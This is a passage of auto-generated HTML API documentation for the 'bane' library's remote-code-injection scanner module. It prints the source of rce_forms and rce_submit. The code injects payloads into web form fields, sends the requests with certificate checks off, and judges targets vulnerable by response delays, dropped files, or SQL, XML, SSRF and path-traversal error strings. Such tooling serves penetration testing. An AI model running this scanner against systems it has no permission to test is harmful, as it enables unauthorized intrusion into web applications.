                                    &#34;tel&#34;,
                                    &#34;search&#34;,
                                    &#34;url&#34;,
                                    &#34;password&#34;,
                                    &#34;number&#34;,
                                    &#34;select&#34;,
                                    &#34;radio&#34;,
                                    &#34;checkbox&#34;,
                                    &#34;color&#34;
                                ]
                                and x[&#34;name&#34;] not in dont_change
                            ):  # any input type that accept direct input from keyboard
                                i = x[&#34;name&#34;]
                                parsed_form = set_up_injection(
                                    target_page,
                                    form_index,
                                    i,
                                    xp,
                                    cookie,
                                    setup_ua(user_agent),
                                    setup_proxy(proxy, proxies),
                                    timeout,
                                    fill_empty,
                                    file_extension=file_extension,
                                    number=number,
                                    email_extension=email_extension,
                                    phone_pattern=phone_pattern,
                                    leave_empty=leave_empty,
                                    dont_send=dont_send,
                                    mime_type=mime_type,
                                    predefined_inputs=predefined_inputs,
                                    dont_change=dont_change,
                                    headers=headers
                                )
                                _res = rce_submit(
                                    parsed_form,
                                    xp,
                                    based_on,
                                    replaceble_parameters,
                                    debug=debug,
                                    enctype=l1[&#34;enctype&#34;],
                                    type_injection=list(injection.keys())[0],
                                )
                                if _res[0] == True:
                                    x = &#34;parameter: &#39;&#34; + i + &#34;&#39; =&gt; [+] Vulnerable !!&#34;
                                    vul.append({&#39;parameter&#39;:i, &#39;context&#39;: _res[1]})
                                    colr = Fore.GREEN
                                else:
                                    x = &#34;parameter: &#39;&#34; + i + &#34;&#39; =&gt; [-] Not Vulnerable&#34;
                                    #sec.append(i)
                                    colr = Fore.RED
                                if _res[2] == True:
                                    x+=Fore.YELLOW+&#34;\n[i] SQL Error detected&#34;
                                    sql_e.append({&#39;parameter&#39;:i, &#39;p_o_c&#39;: _res[-1]})
                                if _res[3]==True:
                                    x+=Fore.YELLOW+&#34;\n[i] XML parsing Error detected&#34;
                                    xml_e.append({&#39;parameter&#39;:i, &#39;p_o_c&#39;: _res[-1]})
                                if _res[4] == True:
                                    x+=Fore.YELLOW+&#34;\n[i] Fetching URL Error detected (potential SSRF)&#34;
                                    ssrf_e.append({&#39;parameter&#39;:i, &#39;p_o_c&#39;: _res[-1]})
                                if _res[5] == True:
                                    x+=Fore.YELLOW+&#34;\n[i] Reading file Error detected (potential path traversal)&#34;
                                    p_t_e.append({&#39;parameter&#39;:i, &#39;p_o_c&#39;: _res[-1]})
                                if logs == True:
                                    print(colr + x + Style.RESET_ALL)
                        except Exception as ex:
                            pass#raise(ex)
            dic.append(
                {
                    &#34;action&#34;: u,
                    &#34;method&#34;: l1[&#34;method&#34;],
                    &#34;vulnerable&#34;: vul,
                    #&#34;safe&#34;: sec,
                    &#34;sql_errors&#34;:sql_e,
                    &#34;xml_parsing_errors&#34;:xml_e,
                    &#34;fetching_url_errors&#34;:ssrf_e,
                    &#34;reading_file_errors&#34;:p_t_e
                }
            )
        if based_on_o == &#34;time&#34;:
            final = {
                &#34;payload&#34;: xp.replace(
                    &#34; {} &#34;.format(int(delay) + 2), &#34; {} &#34;.format(int(delay))
                ),
                &#34;based_on&#34;: based_on_o,
                &#34;injection&#34;: injection,
                &#34;page&#34;: target_page,
                &#34;result&#34;: dic,
            }
        else:
            final = {
                &#34;payload&#34;: xp,
                &#34;based_on&#34;: based_on_o,
                &#34;injection&#34;: injection,
                &#34;page&#34;: target_page,
                &#34;result&#34;: dic,
            }
        if save_to_file:
            with open(save_to_file.split(&#34;.&#34;)[0] + &#34;.json&#34;, &#34;w&#34;) as outfile:
                json.dump(final, outfile, indent=4)
            outfile.close()
        return final</code></pre>
</details>
</dd>
<dt id="bane.scanners.vulnerabilities.rce.rce_submit"><code class="name flex">
<span>def <span class="ident">rce_submit</span></span>(<span>parsed, payload, based_on, replaceble_parameters, debug=False, enctype='application/x-www-form-urlencoded', type_injection='code')</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def rce_submit(
    parsed,
    payload,
    based_on,
    replaceble_parameters,
    debug=False,
    enctype=&#34;application/x-www-form-urlencoded&#34;,
    type_injection=&#34;code&#34;,
):
    &#34;&#34;&#34;&#34;&#34;&#34;
    p_o_c=parsed[0].copy()
    d, fi = setup_to_submit(parsed[0])
    for x in d:
        for y in replaceble_parameters:
            if x == y:
                for z in replaceble_parameters[y]:
                    d[x] = d[x].replace(z[0], z[1])
    if debug == True:
        for x in d:
            print(&#34;{}{} : {}{}&#34;.format(Fore.MAGENTA, x, Fore.WHITE, d[x]))
        for x in fi:
            print(&#34;{}{} : {}{}&#34;.format(Fore.MAGENTA, x, Fore.WHITE, fi[x]))
    if &#34;application/json&#34; in enctype:
        d = json.dumps(d)
    t = time.time()
    if not fi:
        parsed[1].update(
            {
                &#34;Content-Type&#34;: enctype,
                &#34;Referer&#34;: parsed[0][&#34;action&#34;],
                &#34;Origin&#34;: parsed[0][&#34;action&#34;].split(&#34;://&#34;)[0]
                + &#34;://&#34;
                + parsed[0][&#34;action&#34;].split(&#34;://&#34;)[1].split(&#34;/&#34;)[0],
            }
        )
    else:
        parsed[1].update(
            {
                &#34;Referer&#34;: parsed[0][&#34;action&#34;],
                &#34;Origin&#34;: parsed[0][&#34;action&#34;].split(&#34;://&#34;)[0]
                + &#34;://&#34;
                + parsed[0][&#34;action&#34;].split(&#34;://&#34;)[1].split(&#34;/&#34;)[0],
            }
        )
    c=&#39;&#39;
    if parsed[0][&#34;method&#34;] == &#34;get&#34;:
        try:
            c = requests.Session().get(
                parsed[0][&#34;action&#34;],
                params=d,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
            )
            if based_on[0] == &#34;file&#34;:
                c = requests.Session().get(
                    parsed[0][&#34;action&#34;].replace(
                        parsed[0][&#34;action&#34;].split(&#34;/&#34;)[-1], based_on[1] + &#34;.txt&#34;
                    ),
                    params=d,
                    headers=parsed[1],
                    proxies=parsed[2],
                    timeout=parsed[3],
                    verify=False,
                )
                if (c.status_code == 200) and (len(c.text) == 0):
                    return (
                        True,
                        {&#34;reflection&#34;:parsed[0][&#34;action&#34;].replace(
                            parsed[0][&#34;action&#34;].split(&#34;/&#34;)[-1], based_on[1]
                        )
                        + &#34;.txt&#34;,&#34;p_o_c&#34;:p_o_c},
                        any(s in c.text for s in sql_errors),
                        any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c
                    )
            if based_on[0] == &#34;time&#34;:
                if type_injection == &#34;command&#34;:
                    if (int(time.time() - t) &gt;= based_on[1] - 2) or (
                        c.status_code == 504
                    ):
                        return (True, {&#34;p_o_c&#34;:p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
                else:
                    if (int(time.time() - t) &gt;= based_on[1]) or (c.status_code == 504):
                        return (True, {&#34;p_o_c&#34;:p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
        except Exception as e:
            #print(str(e))
            if &#34;Read timed out&#34; in str(e):
                #if based_on[0] == &#34;time&#34;:
                    return (True, {&#34;p_o_c&#34;:p_o_c},False,False,False,False)
    else:
        try:
            c = requests.Session().post(
                parsed[0][&#34;action&#34;],
                data=d,
                files=fi,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
            )
            if based_on[0] == &#34;file&#34;:
                c = requests.Session().get(
                    parsed[0][&#34;action&#34;].replace(
                        parsed[0][&#34;action&#34;].split(&#34;/&#34;)[-1], based_on[1] + &#34;.txt&#34;
                    ),
                    params=d,
                    headers=parsed[1],
                    proxies=parsed[2],
                    timeout=parsed[3],
                    verify=False,
                )
                if (c.status_code == 200) and (len(c.text) == 0):
                    return (
                        True,
                        {&#34;reflection&#34;:parsed[0][&#34;action&#34;].replace(
                            parsed[0][&#34;action&#34;].split(&#34;/&#34;)[-1], based_on[1]
                        )
                        + &#34;.txt&#34;,&#34;p_o_c&#34;:p_o_c},
                        any(s in c.text for s in sql_errors),
                        any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c
                    )
            if based_on[0] == &#34;time&#34;:
                if (int(time.time() - t) &gt;= based_on[1] - 2) or (c.status_code == 504):
                    return (True, {&#34;p_o_c&#34;:p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
                else:
                    if (int(time.time() - t) &gt;= based_on[1]) or (c.status_code == 504):
                        return (True, {&#34;p_o_c&#34;:p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
        except Exception as e:
            #print(str(e))
            if &#34;Read timed out&#34; in str(e):
                #if based_on[0] == &#34;time&#34;:
                    return (True, {&#34;p_o_c&#34;:p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
    return (False, &#34;&#34;,any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)</code></pre>
</details>
</dd>
</dl>
</section>
<section>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.scanners.vulnerabilities" href="index.md">bane.scanners.vulnerabilities</a></code></li>
</ul>
</li>
<li><h3><a href="#header-functions">Functions</a></h3>
<ul class="">
<li><code><a title="bane.scanners.vulnerabilities.rce.rce" href="#bane.scanners.vulnerabilities.rce.rce">rce</a></code></li>
<li><code><a title="bane.scanners.vulnerabilities.rce.rce_forms" href="#bane.scanners.vulnerabilities.rce.rce_forms">rce_forms</a></code></li>
<li><code><a title="bane.scanners.vulnerabilities.rce.rce_submit" href="#bane.scanners.vulnerabilities.rce.rce_submit">rce_submit</a></code></li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>